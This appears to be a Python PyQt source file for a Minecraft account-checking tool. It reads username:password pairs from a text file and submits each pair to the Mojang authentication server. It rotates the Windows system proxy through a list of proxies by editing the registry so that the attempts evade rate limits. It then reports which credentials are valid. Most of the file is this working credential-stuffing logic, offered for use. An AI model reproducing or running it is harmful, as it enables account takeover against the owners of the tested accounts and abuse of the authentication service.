        icon_pushButton_down = QtGui.QIcon()
        icon_pushButton_down.addPixmap(QtGui.QPixmap("res/multimedia.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_down.setIcon(icon_pushButton_down)
    def first(self):
        if self.tabWidget.currentIndex() == 0:
            pass
        else:
            def Thread():
                for i in range(0, 11):
                    op = QtWidgets.QGraphicsOpacityEffect()
                    op.setOpacity(i / 10)
                    self.label_33.setGraphicsEffect(op)
                    time.sleep(0.05)
            Thread = threading.Thread(target=Thread)
            Thread.start()
            self.pushButton_14.show()
            self.tabWidget.setCurrentIndex(0)
            self.anim = QPropertyAnimation(self.label_33, b"geometry")
            self.anim.setDuration(300)
            self.anim.setStartValue(QRect(280, 210, 100, 100))
            self.anim.setEndValue(QRect(280, 90, 591, 141))
            self.anim.start()
            self.anim2 = QPropertyAnimation(self.label_34, b"geometry")
            self.anim2.setDuration(400)
            self.anim2.setStartValue(QRect(300, 210, 10, 10))
            self.anim2.setEndValue(QRect(300, 89, 101, 31))
            self.anim2.start()
            self.anim3 = QPropertyAnimation(self.label_35, b"geometry")
            self.anim3.setDuration(100)
            self.anim3.setStartValue(QRect(300, 210, 10, 10))
            self.anim3.setEndValue(QRect(300, 129, 541, 101))
            self.anim3.start()
    def checker(self):
        if self.label_4.text() == "请选择代理模式":
            CustomMsgBox(self, "请选择代理模式.")
        else:
            text = "当前代理模式: " + self.label_4.text() + "\n" + "当前测卡模式: " + self.comboBox.currentText()
            CustomMsgBox(self, text)
            if self.comboBox.currentText() == "单线程":
                file = open("OutPutProxy.txt", "r")
                ip_num = len(file.readlines())
                file.close()
                file = open("Acount.txt", "r")
                num = len(file.readlines())
                def Proxy():
                    while True:
                        file = open("OutPutProxy.txt", "r")
                        Proxy_num = len(file.readlines())
                        file.close()
                        for i in range(1, Proxy_num):
                            path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
                            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
                            text = linecache.getline("OutPutProxy.txt", i)
                            print(text.replace("\n", ""))
                            proxy = text.replace("\n", "")
                            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy)
                            winreg.CloseKey(key)
                            time.sleep(1)
                Thread = threading.Thread(target=Proxy)
                Thread.start()
                def Thread():
                    for i in range(1, num):
                        file = linecache.getline("Acount.txt", i)
                        text = file.replace("\n", "")
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': acount,
                            'password': password,
                            'requestUser': 'true'
                        })
                        try:
                            answer = requests.post(url, data=request_body, headers=headers).text
                            print(answer)
                            self.textEdit.append(answer)
                            error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                            res = error in answer
                            if res == True:
                                print("Invalid username or password.")
                            else:
                                target = '[{"name":"'
                                location = answer.index(target)
                                username = answer[location:]
                                print(username)
                        except:
                            pass
                Thread = threading.Thread(target = Thread)
                Thread.start()
            if self.comboBox.currentText() == "4线程":  
                file = open("OutPutProxy.txt", "r")
                ip_num = len(file.readlines())
                file.close()
                file = open("Acount.txt", "r")
                num = len(file.readlines())
                file.close()
                x = int(num / 4)
                def Proxy():
                    while True:
                        file = open("OutPutProxy.txt", "r")
                        Proxy_num = len(file.readlines())
                        file.close()
                        for i in range(1, Proxy_num):
                            path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
                            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
                            text = linecache.getline("OutPutProxy.txt", i)
                            print(text.replace("\n", ""))
                            proxy = text.replace("\n", "")
                            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy)
                            winreg.CloseKey(key)
                            time.sleep(1)
                Thread = threading.Thread(target=Proxy)
                Thread.start()
                def Thread():
                    for i in range(1, x):
                        file = linecache.getline("Acount.txt", i)
                        text = file.replace("\n", "")
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': acount,
                            'password': password,
                            'requestUser': 'true'
                        })
                        try:
                            answer = requests.post(url, data=request_body, headers=headers).text
                            print(answer)
                            error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                            res = error in answer
                            if res == True:
                                print("Invalid username or password.")
                            else:
                                target = '[{"name":"'
                                location = answer.index(target)
                                username = answer[location:]
                                print(username)
                        except:
                            pass
                Thread = threading.Thread(target = Thread)
                Thread.start()
                def Thread():
                    for i in range(x, 2 * x):
                        file = linecache.getline("Acount.txt", i)
                        text = file.replace("\n", "")
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': acount,
                            'password': password,
                            'requestUser': 'true'
                        })
                        answer = requests.post(url, data=request_body, headers=headers).text
                        print(answer)
                        error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                        res = error in answer
                        if res == True:
                            print("Invalid username or password.")
                        else:
                            target = '[{"name":"'
                            location = answer.index(target)
                            username = answer[location:]
                            print(username)
                Thread = threading.Thread(target = Thread)
                #Thread.start()
                def Thread():
                    for i in range(2 * x, 3 * x):
                        file = linecache.getline("Acount.txt", i)
                        text = file.replace("\n", "")
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': acount,
                            'password': password,
                            'requestUser': 'true'
                        })
                        answer = requests.post(url, data=request_body, headers=headers).text
                        print(answer)
                        error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                        res = error in answer
                        if res == True:
                            print("Invalid username or password.")
                        else:
                            target = '[{"name":"'
                            location = answer.index(target)
                            username = answer[location:]
                            print(username)
                Thread = threading.Thread(target = Thread)
                #Thread.start()
                def Thread():
                    for i in range(3 * x, 4 * x):
                        file = linecache.getline("Acount.txt", i)
                        text = file.replace("\n", "")
                        target = ":"
                        location = file.index(target)
                        acount = file[0:location]
                        password = file[location + 1:].replace("\n", "")
                        url = "https://authserver.mojang.com/authenticate"
                        headers = {"content-type": "application/json"}
                        request_body = json.dumps({
                            'agent': {
                                'name': 'Minecraft',
                                'version': 1
                            },
                            'username': acount,
                            'password': password,
                            'requestUser': 'true'
                        })
                        answer = requests.post(url, data=request_body, headers=headers).text
                        print(answer)
                        error = '{"error":"ForbiddenOperationException","errorMessage":"Invalid credentials. Invalid username or password."}'
                        res = error in answer
                        if res == True:
                            print("Invalid username or password.")
                        else:
                            target = '[{"name":"'
                            location = answer.index(target)
                            username = answer[location:]
                            print(username)
                Thread = threading.Thread(target = Thread)
                #Thread.start()
    def second(self):
        self.tabWidget.setCurrentIndex(1)
    def third(self):
        self.tabWidget.setCurrentIndex(2)
    def exit(self):
        path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            os._exit(-1)
        Thread = threading.Thread(target=Thread)
        Thread.start()
    def mini(self):
        def Thread():
            for i in reversed(range(0, 11)):
                self.setWindowOpacity(i / 10)
                time.sleep(0.03)
            self.showMinimized()
            self.setWindowOpacity(1)
        Thread = threading.Thread(target=Thread)
        Thread.start()
      # 添加一个退出的提示事件
    def closeEvent(self, event):
        path = "Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        os._exit(-1)
    def mousePressEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = True
            self.m_DragPosition = e.globalPos() - self.pos()
            e.accept()
    def mouseReleaseEvent(self, e):
        if e.button() == Qt.LeftButton:
            self.m_drag = False
    def mouseMoveEvent(self, e):
        try:
            if Qt.LeftButton and self.m_drag:
                self.move(e.globalPos() - self.m_DragPosition)
                e.accept()
        except:
            print("错误代码:000x0")
def main():
    app = QtWidgets.QApplication(sys.argv)
    gui = Check()
    gui.show()
    sys.exit(app.exec_())
if __name__ == '__main__':
    main()